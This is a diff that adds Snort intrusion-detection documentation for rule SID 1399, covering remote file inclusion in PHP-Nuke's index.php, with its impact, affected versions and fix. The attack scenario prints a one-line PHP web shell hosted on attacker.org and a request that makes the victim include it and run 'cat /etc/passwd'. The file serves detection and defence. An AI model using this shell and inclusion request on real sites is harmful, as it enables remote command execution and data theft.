@@ -1,0 +1,81 @@
+Rule: 
+
+--
+Sid:
+1399
+
+--
+Summary:
+This event is generated when an attempt is made to include a remote file
+as part of PHP-Nuke index.php.
+
+--
+Impact:
+Possible information disclosure, or command execution at the priviledge level of
+the user running the webserver.
+
+--
+Detailed Information:
+The index.php included with PHP-nuke allows inclusion of additional files.
+Normal usage might be situations where a webmaster wants to include
+additional code in their index.php.  This can be done via
+"index.php?file=<path_to_file>".  PHP-nuke also allows inclusion of
+files from remote sources specified by either ftp or http as the
+transport protocol.  This allows attackers to craft their own php file
+(say, foo.php) and store it remotely (say, http://mysite.org/foo.php)
+and then instruct the victim machine to include foo.php as part of it's
+source.  Any code in foo.php will get executed on the victim machine.
+
+
+--
+Affected Systems:
+	PHP Nuke 1.0 through 5.3.1
+ 
+--
+Attack Scenarios:
+In an attempt to gain access to a remote site that happens to use PHP-nuke,
+an attacker crafts the following foo.php, and places it on a website that
+he controls:
+	
+	<?php
+	system($cmd);
+	?> 
+
+The attacker can then include foo.php as part of a remote site's index.php
+that uses PHP-nuke, and execute any command:
+
+	lynx \
+	http://victim.com/index.php?file=http://attacker.org/foo.php?cmd=cat%20/etc/passwd
+	
+
+--
+Ease of Attack:
+Simple.
+
+--
+False Positives:
+None Known
+
+
+--
+False Negatives:
+If the page being accessed is not named index.php, but has the same
+vulnerability as the original index.php, the rule will not generate an
+event.
+
+--
+Corrective Action:
+Upgrade to the latest non-affected version of the software.
+
+--
+Contributors:
+Snort documentation contributed by Jon Hart <warchild@spoofed.org>
+Sourcefire Vulnerability Research Team
+Brian Caswell <bmc@sourcefire.com>
+Nigel Houghton <nigel.houghton@sourcefire.com>
+
+-- 
+Additional References:
+
+
+--
